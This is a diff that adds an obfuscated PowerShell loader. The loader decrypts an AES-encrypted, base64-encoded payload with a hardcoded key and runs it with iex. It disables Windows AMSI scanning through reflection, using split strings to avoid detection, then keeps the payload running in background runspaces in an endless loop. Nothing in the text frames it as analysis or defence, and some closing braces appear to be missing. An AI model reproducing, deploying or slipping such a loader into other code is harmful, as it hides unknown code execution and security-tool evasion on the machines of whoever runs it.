@@ -1,0 +1,52 @@
+[Scriptblock]$qvfyxui = {
+function vbqiuydiny($zlpzghgxedzvmhgc, $sjpknmnzzxcizfowtjo, $fcpnfsibxxtxzlsfhrd) {
+    $oqyyayshtq=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+    $oqyyayshtq.Mode="CBC";
+    $oqyyayshtq.Padding = "Zeros";
+    $oqyyayshtq.BlockSize = 128;
+    $oqyyayshtq.KeySize = 256;
+    $oqyyayshtq.IV = $sjpknmnzzxcizfowtjo;
+    $oqyyayshtq.Key = $zlpzghgxedzvmhgc;
+    $ojgftohxosbxfyg=$oqyyayshtq.CreateDecryptor();
+    $oqgurklvocgrqcb=$ojgftohxosbxfyg.TransformFinalBlock($fcpnfsibxxtxzlsfhrd, 0, $fcpnfsibxxtxzlsfhrd.Length);
+    return [System.Text.Encoding]::UTF8.GetString($oqgurklvocgrqcb).Trim([char]0)
+$dwtugeayovmjwpkyfqy = "JmjkzX9k3bZuizC2lE8boXU3ZbovqSPk+/jB7gAO3AiDVHp4zOr97z6ckUOINS/4AExP+UmoWrGCsDtpdau+fVDgCImplpHLyzEMZ02R+rB6y1d6YdPctzIbHgrTgllhlOegxHeNFi4emcHCmpP8CjiKejFekN0LSCOQXstCmW1zck23ocX48YXgjHKxdVUFZBR6urYhDWRxq54yQnXSbbFqMhwDJU1zJO0nKWD8F0Px1TizVDg/jYwIR4IPvsDv0EboNux42tJnxYVrx6Ca6EySDX1DnvwzDaKfSWLMx+/jbGGZOc1FCEAiFwTju0YnRZZslTZ7cTMSXdqKOzhzYx+WzznGyBB9kkEUaMaSfSUP/fDrCzFvSeBya+CyNRsvVLgLqPfJ8g8k4wEOXpSYt6MvJSCMvsf7WoDqxizGxWZd27IljPgZyLHF1MAprJy2WUVuin/MNkWnr0dzW3egvBNZGzTdJYO17jPHaC1Q72AXYoO2xBj5O8Zb/k98LIERa1aaCsYk4bUcBWLoKRVJFf5ann4GFDJyybxX3qLKoR/GKaa9RZgZRzWA820OsXGUJeIRg5vtHBS3+DVQZNYQWk5mvdsEakDNYyLsLhnK+Pao9luTTtU3UY/S6NKyFpbhch2+G251xpVXzlqqgKCOUPJR+S9d3ou/HyKacciPa4FWEBTrNwQYB8ZCysNR6RYmV+nBlsBk+EKUykLdfDa1wPScyDdqxJkyQTMHQWZt7pktZAQ6w1FHIZXA8w/GwHRMPx2gHvoT8zewzLFFQIYDUgY/0HvEFXKubsvwkhO80+wQjZE85rxyRONBeiXFEwPQ3GYgCaAtffKnhTndbD70VDQfqpOiRZcexFcq0DLpyLBARmBKAgbhTg8f+R0yp/T/wYP/3SQxaHNPixr1Xv+S+tZ+SEdCgN7phSF8Ux+sR7PRbcOFm4oMYakKYykHjQNetCw4HaKr1xAGqOVjTSgD0I3HLff6VPF4+mn7OPrE
+$dwtugeayovmjwpkyfqy = [System.Convert]::FromBase64String($dwtugeayovmjwpkyfqy);
+$sjpknmnzzxcizfowtjo = "nBNgcQqN408u/YsCrTyVcA==";
+$sjpknmnzzxcizfowtjo = [System.Convert]::FromBase64String($sjpknmnzzxcizfowtjo);
+$zlpzghgxedzvmhgc = "tpV6xqv5R60WhuQe4gJlhyJ7iM7fwckNKdfa4noguCI="
+$zlpzghgxedzvmhgc = [System.Convert]::FromBase64String($zlpzghgxedzvmhgc);
+$oqgurklvocgrqcb = vbqiuydiny $zlpzghgxedzvmhgc $sjpknmnzzxcizfowtjo $dwtugeayovmjwpkyfqy;
+iex $oqgurklvocgrqcb;
+[Scriptblock]$hnyhsylgfrvesqusqbn = {
+    try{
+        [ref].Assembly.GetType('System.Management.Automation.Amsi' + 'Utils').GetField('amsi'+'InitFailed', 'NonPublic,Static').SetValue($null, $true)
+    }catch{}
+if ([IntPtr]::Size -ne 4)
+    throw 'You ar'+'e running x64 ve'+'rsion of powershe'+'ll. Run x32 v'+'ersion to make it wor'+'k'
+    exit
+$qttwsjp = [runspacefactory]::CreateRunspace()
+$qttwsjp.ApartmentState = "STA"
+$qttwsjp.ThreadOptions = "ReuseThread"
+$qttwsjp.Open()
+$vmeip = [PowerShell]::Create()
+$vmeip.Runspace = $qttwsjp
+$vmeip.AddScript($hnyhsylgfrvesqusqbn) | out-null
+$vmeip.BeginInvoke() | out-null
+Start-Sleep -s 5
+function ztnkydjh{
+    $jsmkx = ((Get-Variable MyInvocation -Scope 1).Value).MyCommand.Path
+    if (-NOT($jsmkx)){
+      $jsmkx = $PSCommandPath
+    return $jsmkx
+$jsmkx = ztnkydjh
+$bwxsfkaushhpwstwern =[runspacefactory]::CreateRunspace()
+$bwxsfkaushhpwstwern.ApartmentState = "STA"
+$bwxsfkaushhpwstwern.ThreadOptions = "ReuseThread"
+$bwxsfkaushhpwstwern.Open()
+$fywanzmfwvlyuchzvr = [PowerShell]::Create()
+$fywanzmfwvlyuchzvr.Runspace = $bwxsfkaushhpwstwern
+$fywanzmfwvlyuchzvr.AddScript($qvfyxui) | out-null
+$fywanzmfwvlyuchzvr.BeginInvoke() | out-null
+while($true){
+    Start-Sleep -s 120
